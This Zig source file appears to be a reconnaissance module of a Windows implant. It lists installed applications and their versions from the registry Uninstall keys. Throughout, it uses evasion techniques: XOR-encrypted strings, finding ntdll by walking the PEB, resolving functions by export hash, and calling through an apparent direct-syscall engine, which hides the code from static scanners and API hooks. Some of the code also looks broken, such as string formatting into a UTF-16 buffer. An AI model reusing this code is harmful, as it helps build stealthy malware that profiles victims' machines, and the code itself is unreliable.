const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub const AppEntry = struct {
    name: []const u8,
    version: []const u8,
};

const E = struct {
    pub const uninstall_path = hash.xorEncrypt("\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    pub const wow6432_path = hash.xorEncrypt("\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    pub const display_name = hash.xorEncrypt("DisplayName");
    pub const display_version = hash.xorEncrypt("DisplayVersion");
    pub const nt_enumerate_key = hash.xorEncrypt("NtEnumerateKey");
    pub const ntdll = hash.xorEncrypt("ntdll.dll");
};

const KEY_BASIC_INFORMATION = extern struct {
    LastWriteTime: types.LARGE_INTEGER,
    TitleIndex: types.ULONG,
    NameLength: types.ULONG,
    Name: [1]u16,
};

const NtEnumerateKeyFn = *const fn (
    KeyHandle: types.HANDLE,
    Index: types.ULONG,
    KeyInformationClass: types.ULONG,
    KeyInformation: types.PVOID,
    Length: types.ULONG,
    ResultLength: *types.ULONG,
) callconv(.winapi) types.NTSTATUS;

fn resolveNtEnumerateKey() ?NtEnumerateKeyFn {
    var ntdll_buf: [E.ntdll.len]u8 = undefined;
    hash.xorDecrypt(&E.ntdll, &ntdll_buf);
    var nek_buf: [E.nt_enumerate_key.len]u8 = undefined;
    hash.xorDecrypt(&E.nt_enumerate_key, &nek_buf);

    const ntdll_base = peb_walk.getModuleByHash(hash.encryptedHashModule(&ntdll_buf)) orelse return null;
    return @as(NtEnumerateKeyFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(ntdll_base, hash.hashStringExact(&nek_buf, 27)) orelse return null,
    )));
}

fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
    @memset(buf, 0);
    for (s, 0..) |c, i| {
        buf[i] = c;
    }
    return .{
        .Length = @as(types.USHORT, @intCast(s.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(buf)),
    };
}

fn openRegKey(path: []const u8) ?types.HANDLE {
    var buf_us: [512]u16 = undefined;
    var us = initUnicodeString(path, &buf_us);
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var key_handle: types.HANDLE = undefined;
    const status = engine.NtOpenKey(&key_handle, types.KEY_QUERY_VALUE | types.KEY_ENUMERATE_SUB_KEYS, @as(types.PVOID, @ptrCast(&oa)));
    return if (status >= 0) key_handle else null;
}

fn readRegWideStringDynamic(allocator: std.mem.Allocator, key: types.HANDLE, value_name: []const u8) ![]u8 {
    var buf_us: [512]u16 = undefined;
    var buf_data: [8192]u8 = undefined;

    var vn = initUnicodeString(value_name, &buf_us);
    var result_len: types.ULONG = 0;
    const status = engine.NtQueryValueKey(
        key,
        &vn,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(&buf_data)),
        @as(types.ULONG, @intCast(buf_data.len)),
        &result_len,
    );
    if (status < 0) return error.RegistryRead;

    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
    const raw = buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..kvpi.DataLength];

    var utf16_len: usize = raw.len / 2;
    while (utf16_len > 0) {
        const c = std.mem.readInt(u16, raw[(utf16_len - 1) * 2 ..][0..2], .little);
        if (c != 0) break;
        utf16_len -= 1;
    }
    if (utf16_len == 0) return allocator.dupe(u8, "");

    var out = std.ArrayList(u8).init(allocator);
    errdefer out.deinit();

    for (0..utf16_len) |i| {
        const cp = std.mem.readInt(u16, raw[i * 2 ..][0..2], .little);
        if (cp < 0x80) {
            try out.append(@as(u8, @intCast(cp & 0x7F)));
        } else if (cp < 0x800) {
            try out.append(@as(u8, @intCast(0xC0 | (cp >> 6))));
            try out.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
        } else {
            try out.append(@as(u8, @intCast(0xE0 | (cp >> 12))));
            try out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F))));
            try out.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
        }
    }
    return try out.toOwnedSlice();
}

fn collectFromUninstallKey(allocator: std.mem.Allocator, reg_path: []const u8) ![]AppEntry {
    const key = openRegKey(reg_path) orelse return &[_]AppEntry{};
    defer _ = engine.NtClose(key);

    var display_name_buf: [E.display_name.len]u8 = undefined;
    hash.xorDecrypt(&E.display_name, &display_name_buf);
    var display_version_buf: [E.display_version.len]u8 = undefined;
    hash.xorDecrypt(&E.display_version, &display_version_buf);

    const nt_enumerate_key = resolveNtEnumerateKey() orelse return &[_]AppEntry{};

    var result = std.ArrayList(AppEntry).init(allocator);
    errdefer {
        for (result.items) |app| {
            allocator.free(app.name);
            allocator.free(app.version);
        }
        result.deinit();
    }

    var index: types.ULONG = 0;
    var buf: [4096]u8 = undefined;

    while (true) {
        var result_len: types.ULONG = 0;
        const status = nt_enumerate_key(
            key,
            index,
            1,
            @as(types.PVOID, @ptrCast(&buf)),
            @as(types.ULONG, @intCast(buf.len)),
            &result_len,
        );
        if (status < 0) break;

        const basic: *align(1) KEY_BASIC_INFORMATION = @ptrCast(&buf);
        const name_bytes = basic.NameLength;
        if (name_bytes == 0) {
            index += 1;
            continue;
        }

        const name_utf16 = @as([*]u16, @ptrCast(&basic.Name))[0 .. name_bytes / 2];
        var name_trimmed_len: usize = name_utf16.len;
        while (name_trimmed_len > 0 and name_utf16[name_trimmed_len - 1] == 0) {
            name_trimmed_len -= 1;
        }
        if (name_trimmed_len == 0) {
            index += 1;
            continue;
        }

        var sub_buf: [512]u16 = undefined;
        const sub_path = std.fmt.bufPrint(&sub_buf, "{s}\\{s}", .{ reg_path, name_utf16[0..name_trimmed_len] }) catch {
            index += 1;
            continue;
        };
        var sub_us = initUnicodeString(sub_path, &sub_buf);
        var oa = types.OBJECT_ATTRIBUTES{
            .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
            .RootDirectory = null,
            .ObjectName = &sub_us,
            .Attributes = types.OBJ_CASE_INSENSITIVE,
            .SecurityDescriptor = null,
            .SecurityQualityOfService = null,
        };
        var sub_handle: types.HANDLE = undefined;
        const sub_status = engine.NtOpenKey(&sub_handle, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa)));
        if (sub_status >= 0) {
            defer _ = engine.NtClose(sub_handle);

            const name = readRegWideStringDynamic(allocator, sub_handle, &display_name_buf) catch {
                index += 1;
                continue;
            };
            errdefer allocator.free(name);

            if (name.len > 0) {
                const version = readRegWideStringDynamic(allocator, sub_handle, &display_version_buf) catch blk: {
                    break :blk try allocator.dupe(u8, "");
                };
                try result.append(AppEntry{ .name = name, .version = version });
            } else {
                allocator.free(name);
            }
        }

        index += 1;
    }

    return try result.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator) ![]AppEntry {
    var uninstall_buf: [E.uninstall_path.len]u8 = undefined;
    hash.xorDecrypt(&E.uninstall_path, &uninstall_buf);

    var wow6432_buf: [E.wow6432_path.len]u8 = undefined;
    hash.xorDecrypt(&E.wow6432_path, &wow6432_buf);

    var result = std.ArrayList(AppEntry).init(allocator);
    errdefer {
        for (result.items) |app| {
            allocator.free(app.name);
            allocator.free(app.version);
        }
        result.deinit();
    }

    const native = try collectFromUninstallKey(allocator, &uninstall_buf);
    defer {
        for (native) |app| {
            allocator.free(app.name);
            allocator.free(app.version);
        }
        allocator.free(native);
    }
    for (native) |app| try result.append(app);

    const wow64 = try collectFromUninstallKey(allocator, &wow6432_buf);
    defer {
        for (wow64) |app| {
            allocator.free(app.name);
            allocator.free(app.version);
        }
        allocator.free(wow64);
    }
    for (wow64) |app| try result.append(app);

    return try result.toOwnedSlice();
}

const testing = std.testing;

test "collect returns list" {
    const list = collect(testing.allocator) catch |err| {
        if (err == error.RegistryRead or err == error.OutOfMemory) return;
        return err;
    };
    defer {
        for (list) |app| {
            testing.allocator.free(app.name);
            testing.allocator.free(app.version);
        }
        testing.allocator.free(list);
    }
    try testing.expect(list.len > 0);
}

test "E values decrypt correctly" {
    var buf: [E.display_name.len]u8 = undefined;
    hash.xorDecrypt(&E.display_name, &buf);
    try testing.expectEqualSlices(u8, "DisplayName", &buf);
}
